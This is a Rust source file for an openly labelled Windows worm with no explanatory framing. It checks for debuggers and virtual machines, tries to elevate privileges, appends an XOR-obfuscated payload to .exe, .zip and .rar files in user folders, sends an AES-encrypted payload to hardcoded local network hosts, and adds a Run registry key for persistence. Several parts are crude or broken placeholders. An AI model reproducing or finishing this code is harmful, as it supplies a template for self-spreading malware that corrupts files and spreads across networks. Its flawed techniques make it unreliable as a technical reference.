use std::fs::{self, File};
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::path::PathBuf;
use std::process::Command;
use std::thread;
use std::time::Duration;
use rand::Rng;
use tokio::net::TcpListener;
use openssl::symm::{Cipher, Crypter, Mode};
use winapi::um::winnt::{HANDLE, PROCESS_ALL_ACCESS};
use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
use winapi::um::handleapi::CloseHandle;

const AES_KEY: &[u8] = b"0123456789abcdef";
const AES_IV: &[u8] = b"abcdef9876543210";

#[tokio::main]
async fn main() -> io::Result<()> {
    if is_debugger_present() || is_virtual_machine() {
        stealth_exit();
    }
    elevate_privileges();
    hide_process();

    let polymorphic_payload = generate_polymorphic_payload();
    tokio::spawn(spread_worm(polymorphic_payload.clone()));

    achieve_persistence();

    loop {
        if should_spread() {
            let new_payload = generate_polymorphic_payload();
            tokio::spawn(spread_worm(new_payload));
        }
        thread::sleep(Duration::from_secs(rand::thread_rng().gen_range(30..180)));
    }
}

fn is_debugger_present() -> bool {
    // Check for debugger presence using common methods
    unsafe { winapi::um::debugapi::IsDebuggerPresent() != 0 }
}

fn is_virtual_machine() -> bool {
    let output = Command::new("powershell")
        .args(["Get-WmiObject", "Win32_ComputerSystem", "| Select-Object", "-ExpandProperty", "Model"])
        .output()
        .expect("Failed to execute PowerShell command");
    let model = String::from_utf8_lossy(&output.stdout);
    model.contains("VMware") || model.contains("VirtualBox")
}

fn stealth_exit() {
    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, 0, winapi::um::processthreadsapi::GetCurrentProcessId());
        if !handle.is_null() {
            TerminateProcess(handle, 0);
            CloseHandle(handle);
        }
    }
}

fn elevate_privileges() {
    Command::new("powershell")
        .args(["Start-Process", "-Verb", "runAs"])
        .status()
        .expect("Failed to elevate privileges");
}

fn hide_process() {
    Command::new("powershell")
        .args(["powershell.exe -Command \"$Process = Get-Process -Id $PID; $Process.Suspend()\""])
        .output()
        .expect("Failed to hide process");
}

fn generate_polymorphic_payload() -> Vec<u8> {
    let base_payload = b"polymorphic worm payload";
    let key: u8 = rand::thread_rng().gen();
    xor_obfuscate(base_payload, key)
}

fn xor_obfuscate(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|b| b ^ key).collect()
}

async fn spread_worm(payload: Vec<u8>) {
    let shared_directories = find_shared_directories();
    for directory in shared_directories {
        let files = find_target_files(&directory);
        for file in files {
            embed_into_file(&file, &payload);
        }
    }
    spread_laterally(&payload).await;
}

fn find_shared_directories() -> Vec<PathBuf> {
    let mut directories = vec![
        dirs::download_dir().unwrap(),
        dirs::desktop_dir().unwrap(),
        PathBuf::from("C:\\Users\\Public\\Downloads"),
        PathBuf::from("C:\\Users\\Public\\Shared"),
    ];
    
    if let Ok(mut user_dir) = std::env::var("USERPROFILE") {
        user_dir.push_str("\\Downloads\\");
        directories.push(PathBuf::from(user_dir));
    }

    directories
}

fn find_target_files(directory: &PathBuf) -> Vec<PathBuf> {
    let mut target_files = Vec::new();
    if let Ok(entries) = fs::read_dir(directory) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.extension().and_then(|s| s.to_str()) == Some("exe") ||
               path.extension().and_then(|s| s.to_str()) == Some("zip") ||
               path.extension().and_then(|s| s.to_str()) == Some("rar") {
                target_files.push(path);
            }
        }
    }
    target_files
}

fn embed_into_file(file_path: &PathBuf, payload: &[u8]) {
    if let Ok(mut file) = File::open(file_path) {
        let mut original_content = Vec::new();
        if file.read_to_end(&mut original_content).is_ok() && !original_content.ends_with(payload) {
            let mut infected_content = original_content.clone();
            infected_content.extend_from_slice(payload);
            let _ = fs::write(file_path, infected_content);
        }
    }
}

async fn spread_laterally(payload: &[u8]) {
    let peers = find_local_network_peers();
    for peer in peers {
        if let Ok(mut stream) = TcpStream::connect(peer) {
            let encrypted_payload = aes_encrypt(payload, AES_KEY, AES_IV).unwrap();
            stream.write_all(&encrypted_payload).expect("Failed to send payload");
        }
    }
}

fn find_local_network_peers() -> Vec<String> {
    vec!["192.168.1.10".to_string(), "192.168.1.11".to_string()]
}

fn achieve_persistence() {
    let _ = Command::new("powershell")
        .args([
            "New-ItemProperty",
            "-Path",
            "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "-Name",
            "worm",
            "-Value",
            "C:\\path_to_worm\\worm.exe",
        ])
        .status();
}

fn aes_encrypt(data: &[u8], key: &[u8], iv: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut crypter = Crypter::new(Cipher::aes_128_cbc(), Mode::Encrypt, key, Some(iv))?;
    let mut ciphertext = vec![0; data.len() + Cipher::aes_128_cbc().block_size()];
    let count = crypter.update(data, &mut ciphertext)?;
    let rest = crypter.finalize(&mut ciphertext[count..])?;
    ciphertext.truncate(count + rest);
    Ok(ciphertext)
}

fn should_spread() -> bool {
    rand::thread_rng().gen_bool(0.3)
}

